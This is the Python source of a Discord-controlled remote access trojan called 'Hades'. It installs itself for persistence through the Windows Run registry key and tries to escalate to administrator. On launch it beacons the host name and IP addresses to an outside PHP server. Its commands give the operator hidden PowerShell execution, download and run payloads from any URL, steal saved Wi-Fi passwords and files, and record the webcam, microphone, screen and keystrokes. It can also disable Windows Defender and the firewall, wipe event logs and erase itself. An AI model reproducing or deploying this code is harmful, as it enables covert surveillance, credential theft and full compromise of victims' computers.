import ssl
import discord
from discord.ext import commands
import requests
import socket
import datetime
import os
import sys
import ctypes
import asyncio
import subprocess
import winreg
import pyautogui
from io import BytesIO
import discord
from discord.ext import commands
import sounddevice as sd
import soundfile as sf
import discord
from discord.ext import commands
import sounddevice as sd
import soundfile as sf
import urllib.parse
import websockets
import win32com.client as wincl 
import asyncio
import base64
import datetime
import io
import json
import os
import platform
import random
import re
import shutil
import ssl
import socket
import sqlite3
import threading
import subprocess
import sys
from mss import mss
import time
import winreg
import ctypes
import urllib.request
import sounddevice as sd
import soundfile as sf
import cv2
import discord
from gtts import gTTS
import psutil
import pyaudio
import pyautogui
import requests
from Cryptodome.Cipher import AES
from discord import Embed, File
from discord.ext import commands, tasks
from getpass import getuser
from io import BytesIO
from os import getenv
from os.path import expanduser
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from win32crypt import CryptUnprotectData
import numpy as np
import ctypes
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import Structure, c_uint, c_int, sizeof, windll, byref
import win32com.client as wincl
import socket
import asyncio
from http.server import SimpleHTTPRequestHandler, HTTPServer
import discord
from discord.ext import commands
from pypresence import Presence
import spotipy
from spotipy.oauth2 import SpotifyOAuth
from dotenv import load_dotenv
import subprocess
import ctypes
import winreg
import win32serviceutil
import win32service
import win32event
import geocoder
import time

# Unique identifier for this PC
PC_ID = os.getenv('PC_ID', 'default_pc_id')

load_dotenv()
# Set up Spotify credentials
SPOTIPY_CLIENT_ID = os.getenv('SPOTIPY_CLIENT_ID')
SPOTIPY_CLIENT_SECRET = os.getenv('SPOTIPY_CLIENT_SECRET')
base_url = os.getenv("BASE_URL")
auth_code = os.getenv("AUTH_CODE")

DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
SPOTIPY_REDIRECT_URI = 'https://localhost:8000'


# Set up Spotify API authentication
sp_oauth = SpotifyOAuth(client_id=SPOTIPY_CLIENT_ID,
                        client_secret=SPOTIPY_CLIENT_SECRET,
                        redirect_uri=SPOTIPY_REDIRECT_URI,
                        scope="user-read-playback-state user-modify-playback-state")
# Initialize intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='/', intents=intents)

# Feature: PUBLIC IP ADDRESS FETCH
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        data = response.json()
        public_ip = data['ip']
        return public_ip
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return 'N/A'

def pc_id_check():
    def wrapper(func):
        async def wrapped(ctx, *args, **kwargs):
            command = ctx.message.content.split()[1]
            if command.startswith(f'{PC_ID}'):
                await func(ctx, *args, **kwargs)
            else:
                await ctx.send(f"Command not executed: This command is intended for a different PC.")
        return wrapped
    return wrapper


# Feature: CREATE CATEGORY & CHANNELS
@bot.event
async def on_ready():
    print(f'Hades synced as {bot.user.name}')
    for guild in bot.guilds:
        # Check if the category and channels already exist
        category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
        if not category:
            # Create the category
            category = await guild.create_category('═══ ・➣ 🐀 RAT PORTAL・')

            # Create the channels
            channel_names = [
                '・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ', 
                '・⌨│ᴛᴇʀᴍɪɴᴀʟ', 
                '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ', 
                '・🔑│ᴋᴇʏʟᴏɢꜱ', 
                '・🔔│ʀᴀᴛ-ʟᴏɢꜱ', 
                '・🔉│ voice-ʟᴏɢꜱ'
            ]
            for name in channel_names:
                await guild.create_text_channel(name, category=category)


         # Get system information
        system_name = socket.gethostname()
        public_ip = get_public_ip()
        try:
            system_ip = socket.gethostbyname(system_name)
        except socket.gaierror:
            system_ip = 'N/A'

        # Find the channel for device logs
        device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
        if device_logs_channel:
            embed = discord.Embed(title='🔵 System is Online', color=0xFF0000)  # Embed Color: Red
            embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)  # Bold Text: System Name
            embed.add_field(name='📢 Public IP Address', value=f'```{public_ip}```', inline=False)  # Bold Text: Public IP Address
            embed.add_field(name='🌐 System IP Address', value=f'```{system_ip}```', inline=False)  # Bold Text: System IP Address

            # Add Footer with bot, date, and time information
            current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            footer_text = f'RAT | Date: {current_time}'
            embed.set_footer(text=footer_text)

            await device_logs_channel.send(embed=embed)
# Prepare the data to be uploaded
         # Prepare the data to be uploaded




    data = {
        'auth_code': 'BJJFH8YRI$*y%',  # Include the authentication code
        'bot_name': bot.user.name,
        'system_name': system_name,
        'public_ip': public_ip,
        'system_ip': system_ip,
        'status': 'online',
        'date': current_time,
    }

    # Construct the URL
    url = f'http://glitch.onlinewebshop.net/hades/status.php?auth={data["auth_code"]}'

    # Upload the data to a web server
    try:
        response = requests.post(url, data=data)  # Sending data as form-encoded

        if response.status_code == 200:
            print('Data uploaded successfully:', response.json())  # Print response from PHP
        else:
            print(f'Failed to upload data. Status code: {response.status_code}, Response: {response.text}')
    except requests.RequestException as e:
        print(f'Error uploading data: {e}')

# Command descriptions
command_descriptions = {
 "/!streamscreen": "Sends the screenshot and sends.",
    "/powershell": "Executes commands using PowerShell.",
    "/bot_commmand": "Executes a command related to a bot.",
    "/sys_log": "Logs system activities.",
    "/lock_sys": "Locks the system.",
    "/set_payload": "Sets a payload for execution.",
    "/grab_wifi": "Grabs WiFi information.",
    "/download": "Downloads a specified file.",
    "/cam_list": "Lists connected cameras.",
    "/list_process": "Lists running processes.",
    "/kill_process": "Terminates a specified process.",
    "/rat_down": "Initiates a remote access tool download.",
    "/sys_restart": "Restarts the system.",
    "/clear": "Clears the current operation.",
    "/voice_rec": "Initiates voice recognition. (Duration must be a positive integer.)",
    "/start_keylogger": "Starts recording keystrokes.",
    "/recscreen": "Records the screen. (Invalid duration. Please specify a valid number after '!recscreen')",
    "/disableantivirus": "Disables antivirus protection.",
    "/disablefirewall": "Disables firewall protection.",
    "/start_server": "Starts a server.",
    "/websocket_server": "Starts a WebSocket server.",
    "/now_playing": "Gets the current song playing in Spotify.",
    "/play": "Plays a song in Spotify. (Example: /play faded)",
    "/pause": "Pauses the current song in Spotify.",
    "/resume": "Resumes playback of the current song in Spotify.",
    "/next": "Plays the next song in the Spotify playlist.",
    "/previous": "Plays the previous song in the Spotify playlist.",
    "/like": "Likes the current song in Spotify.",
    "/battery": "Retrieves battery status.",
    "/cleartracks": "Clears tracks and logs.",
    "/self_destruct": "Initiates self-destruction.",
    "/ping": "Sends a ping to check status.",
    "/sys_info": "Retrieves system information.",
    "/screen_share": "Shares the screen.",
    "/start_logging": "Starts logging activities.",
    "/camic [cam_id]": "Takes a shot with the default webcam or the specified webcam ID."
}

# Bot help command
@bot.command(name='bot_commands')
async def bot_commands(ctx):
    help_message = "**Available Commands:**\n\n"
    for command, description in command_descriptions.items():
        help_message += f"{command}: {description}\n\n"

    # Send the message inside a code block
    boxed_help_message = f"```md\n{help_message}```"
    await ctx.send(boxed_help_message)

# Function to remove startup key
# Function to remove startup key
def remove_startup_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "MyStartupKey")
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass

# Function to add to startup
def add_to_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
    executable_path = os.path.abspath(sys.executable)
    winreg.SetValueEx(key, "MyStartupKey", 0, winreg.REG_SZ, executable_path)
    winreg.CloseKey(key)

# Function to run as admin
def run_as_admin():
    script_filename = os.path.abspath(sys.argv[0])
    params = f'"{script_filename}"'
    shell32 = ctypes.windll.shell32
    shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

# Check if the script is executed as the main program
if __name__ == "__main__":
    remove_startup_key()
    try:
        add_to_startup()
    except PermissionError:
        run_as_admin()

# Powershell command
@bot.command()
async def powershell(ctx, *, command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        output = subprocess.check_output(["powershell", command], startupinfo=startupinfo, universal_newlines=True)
        if len(output) > 2000:
            with open('output.txt', 'w', encoding='utf-8') as file:
                file.write(output)
            await ctx.send(file=discord.File('output.txt'))
            os.remove('output.txt')
        else:
            await ctx.send(f'```{output}```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command execution failed with error code {e.returncode}')

# System log command
@bot.command()
async def sys_log(ctx):
    try:
        fetching_time = 60  # Time in seconds to fetch system logs
        backup_count = fetching_time

        countdown_message = await ctx.send(f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count} seconds left```")

        for count in range(backup_count - 1, 0, -1):
            await asyncio.sleep(1)
            backup_count = count
            await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count} seconds left```")

        await asyncio.sleep(1)
        await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count - 1} seconds left```")

        # Use PowerShell to get system logs
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window

        command = ["powershell", "-Command", "Get-WinEvent -LogName System | Select-Object -Property TimeCreated, Message"]
        output = subprocess.check_output(command, startupinfo=startupinfo, universal_newlines=True)

        with open('syslog.txt', 'w', encoding='utf-8') as file:
            file.write(output)

        await ctx.send("System logs retrieved : ``syslog.txt``")
        await ctx.send(file=discord.File('syslog.txt'))
        os.remove('syslog.txt')

    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command execution failed with error code {e.returncode}')
    except Exception as e:
        await ctx.send(f'An unexpected error occurred: {str(e)}')

#lock pc
@bot.command()
async def lock_sys(ctx):
    ctypes.windll.user32.LockWorkStation()
    await ctx.send('PC locked.')



#set playload 
@bot.command()
async def set_payload(ctx, url: str):
    try:
        parsed_url = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed_url.path)

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        max_retry_attempts = 3
        retry_delay = 2

        for attempt in range(1, max_retry_attempts + 1):
            try:
                response = requests.get(url, verify=False)
                response.raise_for_status()
                content = response.content
                break

            except (requests.RequestException, IOError) as e:
                await ctx.send(f'Error downloading the file: {str(e)}. Retrying in {retry_delay} seconds...')
                await asyncio.sleep(retry_delay)

                if attempt == max_retry_attempts:
                    await ctx.send('Maximum number of retry attempts reached. Unable to download the file.')
                    return

        # Use a temporary directory instead of the Downloads folder
        temp_dir = os.path.join(os.path.expanduser("~"), "Downloads")
        file_path = os.path.join(temp_dir, filename)

        with open(file_path, 'wb') as file:
            file.write(content)

        await ctx.send(f'File downloaded successfully to ``📁 {file_path}``')

        # Execute the file using PowerShell
        command = ['powershell.exe', '-Command', f'start-process -FilePath "{file_path}"']
        subprocess.run(command, shell=True)

        await ctx.send('File installed and executed.')

        await asyncio.sleep(10)

        os.remove(file_path)

        await ctx.send('File deleted permanently.')

    except (urllib.error.URLError, requests.exceptions.RequestException, IOError) as e:
        await ctx.send(f'Error: {str(e)}')

    except Exception as e:
        await ctx.send(f'Unexpected error: {str(e)}')



#to get wifi passward
@bot.command()
async def grab_wifi(ctx):
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout

        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]

        wifi_passwords = []

        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            profile_output = result.stdout

            if "Key Content" in profile_output:
                password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
                wifi_passwords.append((profile, password_line[0]))

        if wifi_passwords:
            for wifi in wifi_passwords:
                await ctx.send(f'``📶 Wi-Fi Network: {wifi[0]}, 🔑 Password: {wifi[1]}``')
        else:
            await ctx.send('No saved Wi-Fi passwords found.')
    except Exception as e:
        await ctx.send(f'Error occurred while retrieving Wi-Fi passwords: {str(e)}')

#dowload function
@bot.command()
async def download(ctx, source_path):
    target_channel = ctx.message.channel  # Use the current Discord channel as the target channel
    try:
        with open(source_path, 'rb') as file:
            await target_channel.send(file=discord.File(file))
        filename = os.path.basename(source_path)
        await ctx.send(f"📁 ``{filename}`` Downloaded Successfully!")
    except FileNotFoundError:
        await ctx.send("Source file not found.")

# Command : CAM LIST
@bot.command()
async def cam_list(ctx):
    # Get the list of available webcam devices
    device_list = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            _, _ = cap.read()
            device_list.append(f"Webcam {i}")
            cap.release()
        else:
            break

    # Send the list of webcam devices to Discord
    device_info = '\n'.join(device_list)
    await ctx.send(f"Available webcam devices:\n{device_info}")

# Command : CAMIC
@bot.command()
async def camic(ctx, device_id=None):
    # Check if a specific webcam device is provided
    if device_id is not None:
        try:
            device_id = int(device_id)
        except ValueError:
            await ctx.send("Invalid device ID. Please provide a valid numeric ID.")
            return
    else:
        device_id = 0  # Default to the first webcam device

    # Capture photo from the specified webcam
    cap = cv2.VideoCapture(device_id)
    if not cap.isOpened():
        await ctx.send("Failed to open the webcam device.")
        return

    ret, frame = cap.read()

    # Convert the frame to bytes
    _, buffer = cv2.imencode('.jpg', frame)
    img_bytes = buffer.tobytes()

    # Send the photo to Discord
    picture = discord.File(io.BytesIO(img_bytes), filename='webcam_photo.jpg')
    await ctx.send(file=picture)

    # Release the webcam
    cap.release()

# Command : LIST PROCESS
@bot.command()
async def list_process(ctx):
    try:
        process_list = psutil.process_iter()
        processes = [p.name() for p in process_list]

        if processes:
            process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
            process_str = ""
            for chunk in process_chunks:
                process_str += '\n'.join(chunk) + '\n'

            file = io.BytesIO(process_str.encode())
            await ctx.send(file=File(file, filename='process_list.txt'))
        else:
            await ctx.send('No process found.')

    except Exception as e:
        await ctx.send(f'Error listing process: {str(e)}')

# Command : KILL PROCESS
@bot.command()
async def kill_process(ctx, name: str):
    try:
        if sys.platform == 'win32':
            process = subprocess.run(['taskkill', '/F', '/IM', name], capture_output=True)
        else:
            process = subprocess.run(['killall', name], capture_output=True)

        if process.returncode == 0:
            await ctx.send(f'Process ``{name}`` killed.')
        else:
            error_output = process.stderr.decode().strip()
            await ctx.send(f'Error killing process: {error_output}')

    except Exception as e:
        await ctx.send(f'Error killing process: {str(e)}')

# Command : RAT SHUTDOWN
@bot.command()
@commands.is_owner()
async def rat_down(ctx):
    await ctx.send("``🔩 Shutting down...``")
    await bot.close()

# Command : SYSTEM SHUTDOWN
@bot.command()
async def sys_shutdown(ctx):
    await ctx.send("Shutting down...")
    subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)

# Command : SYSTEM RESTART
@bot.command()
async def sys_restart(ctx):
    await ctx.send("Restarting...")
    subprocess.run(["shutdown", "/r", "/t", "0"])
    
# Command : CLEAR
@bot.command()
@commands.is_owner()
async def clear(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"``Cleared {amount} messages 🗑️``", delete_after=3)

#get voice recording
@bot.command()
async def voice_rec(ctx, duration: int):
    # Check if the duration is valid
    if duration <= 0:
        await ctx.send("Duration must be a positive integer.")
        return

    # Start recording audio from the system microphone
    fs = 44100  # Sample rate
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()

    # Save the recorded audio to a file
    filename = "recorded_audio.wav"
    sf.write(filename, recording, fs)

    #Send the recorded audio to a specific text channel
    text_channel_id =   ENTER_CHANNEL_ID
    text_channel = bot.get_channel(text_channel_id)
    if text_channel:
        await text_channel.send(file=discord.File(filename))
        await ctx.send("[*] Audio sent to specified text channel successfully")
    else:
        await ctx.send("Text channel not found.")

#keylog
@bot.command()
async def start_keylogger(ctx):
    await ctx.send("Keylogger started.")

    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)
        
        # Send the key to the Discord channel
        channel = bot.get_channel(1236994679560601693)  # Replace YOUR_CHANNEL_ID with your channel's ID
        if channel:
            asyncio.ensure_future(channel.send(f"Key pressed: {key_char}"))

    # Start the keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()


#streamscrenn
@bot.command()
async def recscreen(ctx):
    try:
        reclenth = float(ctx.message.content[10:])
    except ValueError:
        await ctx.send("Invalid duration. Please specify a valid number after '!recscreen'.")
        return
    if reclenth <= 0:
        await ctx.send("Invalid duration. Please specify a positive number after '!recscreen'.")
        return

    input2 = 0
    while True:
        input2 = input2 + 1
        input3 = 0.045 * input2
        if input3 >= reclenth:
            break

    SCREEN_SIZE = (1920, 1080)
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    temp = os.getenv('TEMP')
    videeoo = os.path.join(temp, "output.avi")
    out = cv2.VideoWriter(videeoo, fourcc, 20.0, SCREEN_SIZE)
    counter = 1
    while True:
        counter = counter + 1
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
        if counter >= input2:
            break
    out.release()
    check = os.path.join(temp, "output.avi")
    check2 = os.stat(check).st_size
    if check2 > 7340032:
        await ctx.send("This may take some time because it is over 8 MB. Please wait.")
        with open(check, "rb") as f:
            boom = requests.post('https://file.io/', files={"file": f}).json()["link"]
        await ctx.send("Video download link: " + boom)
        await ctx.send("[*] Command successfully executed")
        os.remove(check)
    else:
        file = discord.File(check, filename="output.avi")
        await ctx.send("[*] Command successfully executed", file=file)
        os.remove(check)
@bot.command
async def disableantivirus(message):
   
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            instruction = """REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber" """
            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = str(output.stdout.decode('CP437'))
            build_number = result.split()[2:]
            if build_number <= ['17763']:
                os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                await message.channel.send("[*] Windows Defender disabled successfully.")
            elif build_number >= ['18362']:
                os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                await message.channel.send("[*] Windows Defender exclusion added successfully.")
            else:
                await message.channel.send("[*] An unknown error has occurred.")
        else:
            await message.channel.send("[*] This command requires admin privileges.")
@bot.command()
async def disableantivirus(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        instruction = 'REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"'
        output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = str(output.stdout.decode('CP437'))
        build_number = result.split()[2:]
        if build_number <= ['17763']:
            os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
            await ctx.send("[*] Windows Defender disabled successfully.")
        elif build_number >= ['18362']:
            os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
            await ctx.send("[*] Windows Defender exclusion added successfully.")
        else:
            await ctx.send("[*] An unknown error has occurred.")
    else:
        await ctx.send("[*] This command requires admin privileges.")

@bot.command()
async def disablefirewall(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        os.system(r"netsh advfirewall set allprofiles state off")
        await ctx.send("[*] Windows Firewall disabled successfully.")
    else:
        await ctx.send("[*] This command requires admin privileges.")


@bot.command()
async def start_server(ctx):
    # Create an asyncio loop for the web server and WebSocket server
    loop = asyncio.get_event_loop()

    # Create and start the web server
    async def web_server():
        app = web.Application()
        async def hello(request):
            return web.Response(text="Hello, world")
        app.add_routes([web.get('/', hello)])
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, 'localhost', 8080)
        await site.start()
        await ctx.send("Web server started at http://localhost:8080")

    # Create and start the WebSocket server
    @bot.command()
    async def websocket_server(websocket, path):
        while True:
            message = await websocket.recv()
            print(f"Received message: {message}")
            await websocket.send(f"Echo: {message}")

    # Run both servers concurrently
    loop.create_task(web_server())
    start_server = websockets.serve(websocket_server, "localhost", 8765)
    loop.run_until_complete(start_server)
    await ctx.send("WebSocket server started at ws://localhost:8765")


@bot.command()
async def now_playing(ctx):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)  # Initialize Spotify object here
        current_track = sp.current_playback()
        if current_track and current_track['is_playing']:
            track_name = current_track['item']['name']
            artists = ', '.join([artist['name'] for artist in current_track['item']['artists']])
            album_name = current_track['item']['album']['name']
            album_cover_url = current_track['item']['album']['images'][0]['url']  # Get the URL of the first image (usually thumbnail)

            embed = discord.Embed(title='Now Playing', description=f'{track_name} by {artists}', color=discord.Color.green())
            embed.set_thumbnail(url=album_cover_url)
            embed.add_field(name='Album', value=album_name, inline=False)

            await ctx.send(embed=embed)
        else:
            await ctx.send('No track is currently playing.')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error retrieving current playback.')



@bot.command()
async def play(ctx, *, song_name):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)
        results = sp.search(q=song_name, limit=1, type='track')

        if results['tracks']['items']:
            track_uri = results['tracks']['items'][0]['uri']
            sp.start_playback(uris=[track_uri])
            await ctx.send(f'Now playing: {results["tracks"]["items"][0]["name"]} by {", ".join([artist["name"] for artist in results["tracks"]["items"][0]["artists"]])}')
        else:
            await ctx.send(f'Could not find the song: {song_name}')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error playing the song.')

@bot.command()

async def pause(ctx):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)
        sp.pause_playback()
        await ctx.send('Playback paused.')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error pausing the playback.')

@bot.command()
async def resume(ctx):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)
        sp.start_playback()
        await ctx.send('Playback resumed.')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error resuming the playback.')

@bot.command()
async def next(ctx):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)
        sp.next_track()
        await ctx.send('Playing next track.')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error skipping to the next track.')

@bot.command()
async def previous(ctx):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)
        sp.previous_track()
        await ctx.send('Playing previous track.')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error skipping to the previous track.')

@bot.command()
async def like(ctx):
    try:
        sp = spotipy.Spotify(auth_manager=sp_oauth)
        current_playback = sp.current_playback()

        if current_playback and 'item' in current_playback and current_playback['item']:
            track_id = current_playback['item']['id']
            sp.current_user_saved_tracks_add([track_id])
            await ctx.send(f'Liked the track: {current_playback["item"]["name"]}')
        else:
            await ctx.send('No track is currently playing.')
    except spotipy.exceptions.SpotifyException as e:
        print(f"Spotify API Error: {e}")
        await ctx.send('Error liking the track.')




def get_battery_status():
    battery = psutil.sensors_battery()
    
    if battery is None:
        return "Battery information not available."

    charge_percent = battery.percent
    is_plugged = battery.power_plugged

    charging_state = "Charging" if is_plugged else "Not Charging"

    return f"Battery charge: {charge_percent}%\nCharging state: {charging_state}"

@bot.command()
async def battery(ctx):
    status = get_battery_status()
    await ctx.send(status)
def clear_log_file(log_file_path):
    with open(log_file_path, 'w'):
        pass

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)
        return f"Deleted file: {file_path}"
    else:
        return f"File not found: {file_path}"

def clear_logs():
    try:
        # Example for clearing system logs on Windows
        subprocess.run(["wevtutil", "cl", "Application"], check=True, capture_output=True, text=True)
        subprocess.run(["wevtutil", "cl", "Security"], check=True, capture_output=True, text=True)
        subprocess.run(["wevtutil", "cl", "System"], check=True, capture_output=True, text=True)
        return "Cleared system event logs."
    except subprocess.CalledProcessError as e:
        return f"Error clearing system logs: {e.stderr.strip()}"

@bot.command()
async def cleartracks(ctx):
    try:
        clear_logs_msg = clear_logs()
        await ctx.send(f"Cleared all logs and system event logs.\n{clear_logs_msg}")
    except Exception as e:
        await ctx.send(f"Failed to clear logs. Make sure to run the bot as administrator on Windows. Error: {str(e)}")









@bot.command()
async def self_destruct(ctx):
    await ctx.send('Initiating self-destruction sequence...')
    
    # Remove script file (be cautious with this step)
    script_file = __file__
    if os.path.exists(script_file):
        # Overwrite the file content with random data to make recovery difficult
        with open(script_file, 'wb') as f:
            f.write(os.urandom(1024))
        os.remove(script_file)
































@bot.command()
async def ping(ctx):
    start_time = datetime.datetime.now()
    message = await ctx.send('Calculating ping...')
    end_time = datetime.datetime.now()

    latency = round((end_time - start_time).total_seconds() * 1000)

    if latency < 50:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :green_circle: Excellent'
    elif latency < 100:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :yellow_circle: Moderate'
    else:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :red_circle: Poor'

    response = response.replace(":green_circle:", "🟢")
    response = response.replace(":yellow_circle:", "🟡")
    response = response.replace(":red_circle:", "🔴")

    await message.edit(content=f'```\n{response}\n```')

    if latency >= 50:
        await asyncio.sleep(5)
        await message.edit(content=f'```\nLatency increased to: {latency}ms\n```')
    elif latency < 50:
        await asyncio.sleep(5)
        await message.edit(content=f'```\nLatency decreased to: {latency}ms\n```')

# Function : SYSTEM INFO
# Helper functions to extract specific information from systeminfo command output
def get_value_by_label(label, output):
    label = label + ":"
    lines = output.splitlines()
    for line in lines:
        if line.startswith(label):
            return line.split(label)[1].strip()
    return None

def get_os_version(output):
    return get_value_by_label("OS Version", output)

def get_os_manufacturer(output):
    return get_value_by_label("OS Manufacturer", output)

def get_os_configuration(output):
    return get_value_by_label("OS Configuration", output)

def get_os_build_type(output):
    return get_value_by_label("OS Build Type", output)

def get_registered_owner(output):
    return get_value_by_label("Registered Owner", output)

def get_registered_organization(output):
    return get_value_by_label("Registered Organization", output)

def get_product_id(output):
    return get_value_by_label("Product ID", output)

def get_original_install_date(output):
    return get_value_by_label("Original Install Date", output)

def get_system_boot_time(output):
    return get_value_by_label("System Boot Time", output)

def get_system_manufacturer(output):
    return get_value_by_label("System Manufacturer", output)

def get_system_model(output):
    return get_value_by_label("System Model", output)

def get_system_type(output):
    return get_value_by_label("System Type", output)

def get_processors(output):
    return get_value_by_label("Processor(s)", output)

def get_bios_version(output):
    return get_value_by_label("BIOS Version", output)

def get_windows_directory(output):
    return get_value_by_label("Windows Directory", output)

def get_system_directory(output):
    return get_value_by_label("System Directory", output)

def get_boot_device(output):
    return get_value_by_label("Boot Device", output)

def get_system_locale(output):
    return get_value_by_label("System Locale", output)

def get_input_locale(output):
    return get_value_by_label("Input Locale", output)

def get_time_zone(output):
    return get_value_by_label("Time Zone", output)

def get_available_physical_memory(output):
    return get_value_by_label("Available Physical Memory", output)

def get_virtual_memory_max_size(output):
    return get_value_by_label("Virtual Memory: Max Size", output)

def get_virtual_memory_available(output):
    return get_value_by_label("Virtual Memory: Available", output)

def get_virtual_memory_in_use(output):
    return get_value_by_label("Virtual Memory: In Use", output)

def get_page_file_locations(output):
    return get_value_by_label("Page File Location(s)", output)

def get_domain(output):
    return get_value_by_label("Domain", output)

def get_logon_server(output):
    return get_value_by_label("Logon Server", output)

def get_hotfixes(output):
    return get_value_by_label("Hotfix(s)", output)

def get_network_cards(output):
    return get_value_by_label("Network Card(s)", output)

def get_hyperv_requirements(output):
    return get_value_by_label("Hyper-V Requirements", output)

def get_battery_percentage(output):
    return get_value_by_label("Battery Percentage", output)

# Command : SYSTEM INFO
@bot.command()
async def sys_info(ctx):
    try:
        os_info = subprocess.run(
            'powershell.exe systeminfo', 
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout
    except FileNotFoundError:
        await ctx.send("The 'systeminfo' command is not available on this system.")
        return

    os_version = get_os_version(os_info)
    os_manufacturer = get_os_manufacturer(os_info)
    os_configuration = get_os_configuration(os_info)
    os_build_type = get_os_build_type(os_info)
    registered_owner = get_registered_owner(os_info)
    registered_organization = get_registered_organization(os_info)
    product_id = get_product_id(os_info)
    original_install_date = get_original_install_date(os_info)
    system_boot_time = get_system_boot_time(os_info)
    system_manufacturer = get_system_manufacturer(os_info)
    system_model = get_system_model(os_info)
    system_type = get_system_type(os_info)
    processors = get_processors(os_info)
    bios_version = get_bios_version(os_info)
    windows_directory = get_windows_directory(os_info)
    system_directory = get_system_directory(os_info)
    boot_device = get_boot_device(os_info)
    system_locale = get_system_locale(os_info)
    input_locale = get_input_locale(os_info)
    time_zone = get_time_zone(os_info)
    available_physical_memory = get_available_physical_memory(os_info)
    virtual_memory_max_size = get_virtual_memory_max_size(os_info)
    virtual_memory_available = get_virtual_memory_available(os_info)
